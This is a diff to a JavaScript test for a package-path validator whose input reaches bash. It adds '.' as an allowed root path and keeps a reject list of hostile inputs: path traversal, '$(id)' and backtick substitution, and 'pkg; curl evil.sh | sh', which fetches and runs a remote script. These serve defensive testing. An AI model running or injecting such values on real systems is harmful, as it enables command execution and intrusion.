@@ -34,9 +34,12 @@ test('head sha must be a 40-character lowercase hex commit id', () => {
 });
 
 test('the package path is an allowlist, because it reaches bash', () => {
-  for (const good of ['sui-contracts', 'packages/core', 'a/b/c-d_e.f', '.hidden-pkg']) {
+  for (const good of ['sui-contracts', 'packages/core', 'a/b/c-d_e.f', '.hidden-pkg', '.']) {
     assert.equal(validatePackagePath(good).ok, true, `should accept ${good}`);
   }
+  // "." is a whole-value allowance for root packages, never a segment allowance —
+  // 'a/./b' stays in the reject list below.
+  assert.equal(validatePackagePath('.').value, '.');
   for (const bad of [
     '', '/etc', '../../etc', 'a/../../b', 'a/./b', 'a//b', 'pkg/',
     'pkg; curl evil.sh | sh', 'pkg$(id)', 'pkg`id`', 'pkg with space',
